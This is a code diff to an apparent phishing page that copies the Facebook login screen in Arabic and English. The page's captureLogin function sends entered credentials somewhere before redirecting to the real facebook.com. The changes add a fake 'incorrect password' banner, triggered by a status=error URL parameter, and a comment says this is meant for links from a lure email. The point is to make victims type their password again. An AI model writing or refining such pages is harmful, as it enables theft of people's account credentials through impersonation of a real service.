@@ -56,7 +56,7 @@
       align-items: center;
       justify-content: flex-start;
       width: 100%;
-      padding: 35px 16px 0;
+      padding: 25px 16px 0;
     }
 
     .content-wrapper {
@@ -69,7 +69,7 @@
 
     /* ضبط أبعاد الشعار العلوي للفيسبوك */
     .fb-logo-container {
-      margin-bottom: 45px;
+      margin-bottom: 35px;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -79,6 +79,21 @@
       width: 110px; 
       height: auto;
       display: block;
+    }
+
+    /* شريط رسالة الخطأ المتناسق والمطابق لفيسبوك */
+    .error-banner {
+      display: none; /* مخفي افتراضياً ويظهر فقط عند استدعائه */
+      width: 100%;
+      background-color: #FFEBEB;
+      border: 1px solid #E6B3B3;
+      color: #333333;
+      padding: 12px;
+      border-radius: 8px;
+      margin-bottom: 16px;
+      font-size: 13.5px;
+      line-height: 1.4;
+      text-align: right;
     }
 
     /* هيكلة حقول الإدخال لتسمح بارتفاع النص التوضيحي */
@@ -95,7 +110,7 @@
     
     .input-container input {
       width: 100%;
-      padding: 22px 16px 10px 16px; /* زيادة الطول الداخلي ليتسع النص بالأعلى */
+      padding: 22px 16px 10px 16px; 
       border: 1px solid #ccd0d5;
       border-radius: 12px; 
       font-size: 16px;
@@ -110,7 +125,7 @@
       border-color: #1877f2;
     }
 
-    /* النص التوضيحي العائم (التأثير المطلوب) */
+    /* النص التوضيحي العائم */
     .input-container label {
       position: absolute;
       right: 16px;
@@ -129,7 +144,7 @@
       top: 13px;
       font-size: 11.5px;
       transform: translateY(-50%);
-      color: #757a82; /* الحفاظ على اللون كما في فيسبوك */
+      color: #757a82; 
     }
 
     /* أزرار تسجيل الدخول وإنشاء الحساب */
@@ -155,14 +170,14 @@
       border: none;
       margin-bottom: 20px;
       font-size: 16px;
-      height: 48px; /* طول ثابت ومناسب للزر والدائرة بالداخل */
+      height: 48px; 
     }
     
     .login-btn:hover {
       background-color: #0056c2;
     }
 
-    /* تصميم دائرة التحميل المخفية افتراضياً */
+    /* تصميم دائرة التحميل */
     .spinner {
       display: none;
       width: 22px;
@@ -202,7 +217,7 @@
       height: 48px;
     }
 
-    /* تنسيق تذييل الصفحة المطور - جعل كلمة Meta على يمين الشعار */
+    /* تنسيق تذييل الصفحة المطور */
     .meta-footer {
       color: #1c1e21;
       font-size: 14px;
@@ -351,6 +366,10 @@
       <div class="fb-logo-container">
         <img src="fb_logo.jpeg" alt="Facebook" class="fb-logo-img">
       </div>
+
+      <div class="error-banner" id="error-banner">
+        كلمة السر التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.
+      </div>
       
       <div class="input-group">
         <div class="input-container">
@@ -384,8 +403,8 @@
 
   <script>
     const realTranslations = {
-      'ar': { 'langText': 'العربية', 'emailPH': 'رقم الهاتف المحمول أو البريد الإلكتروني', 'passPH': 'كلمة السر', 'loginBtn': 'تسجيل الدخول', 'forgotLnk': 'هل نسيت كلمة السر؟', 'createBtn': 'إنشاء حساب جديد', 'dir': 'rtl' },
-      'en': { 'langText': 'English (US)', 'emailPH': 'Mobile number or email address', 'passPH': 'Password', 'loginBtn': 'Log In', 'forgotLnk': 'Forgotten password?', 'createBtn': 'Create new account', 'dir': 'ltr' }
+      'ar': { 'langText': 'العربية', 'emailPH': 'رقم الهاتف المحمول أو البريد الإلكتروني', 'passPH': 'كلمة السر', 'loginBtn': 'تسجيل الدخول', 'forgotLnk': 'هل نسيت كلمة السر؟', 'createBtn': 'إنشاء حساب جديد', 'errorMsg': 'كلمة السر التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.', 'dir': 'rtl' },
+      'en': { 'langText': 'English (US)', 'emailPH': 'Mobile number or email address', 'passPH': 'Password', 'loginBtn': 'Log In', 'forgotLnk': 'Forgotten password?', 'createBtn': 'Create new account', 'errorMsg': 'The password you entered is incorrect. Please try again.', 'dir': 'ltr' }
     };
 
     const languagesData = [
@@ -424,21 +443,23 @@
       document.documentElement.dir = t.dir;
       
       const footer = document.querySelector('.meta-footer');
+      const errorBanner = document.getElementById('error-banner');
+
       if(t.dir === 'ltr') {
         footer.style.direction = 'ltr';
+        errorBanner.style.textAlign = 'left';
       } else {
         footer.style.direction = 'rtl';
+        errorBanner.style.textAlign = 'right';
       }
 
       document.getElementById('current-lang-display').innerText = displayName;
-      
-      // ترجمة النصوص التوضيحية العائمة
       document.getElementById('email-label').innerText = t.emailPH;
       document.getElementById('password-label').innerText = t.passPH;
-      
       document.getElementById('btn-text').innerText = t.loginBtn;
       document.getElementById('forgot-link').innerText = t.forgotLnk;
       document.getElementById('create-btn').innerText = t.createBtn;
+      errorBanner.innerText = t.errorMsg;
     }
 
     function captureLogin() {
@@ -462,7 +483,6 @@
       const btnText = document.getElementById('btn-text');
       const spinner = document.getElementById('btn-spinner');
 
-      // تفعيل تأثير التحميل والدائرة الدوارة
       btnText.style.display = 'none';
       spinner.style.display = 'block';
       loginBtn.style.opacity = "0.85";
@@ -478,13 +498,20 @@
         .then(() => {
           window.location.href = "https://www.facebook.com"; 
         }, (error) => {
-          // إعادة الوضع الطبيعي في حال الفشل
           btnText.style.display = 'block';
           spinner.style.display = 'none';
           loginBtn.style.opacity = "1";
           alert("حدث خطأ في الاتصال بالإنترنت، يرجى المحاولة لاحقاً.");
         });
     }
+
+    // كود فحص الرابط عند تحميل الصفحة لتحديد ما إذا كان قادماً من زر "خطأ" الإيميل أم لا
+    window.addEventListener('DOMContentLoaded', () => {
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get('status') === 'error') {
+        document.getElementById('error-banner').style.display = 'block';
+      }
+    });
     
     renderLanguages();
   </script>
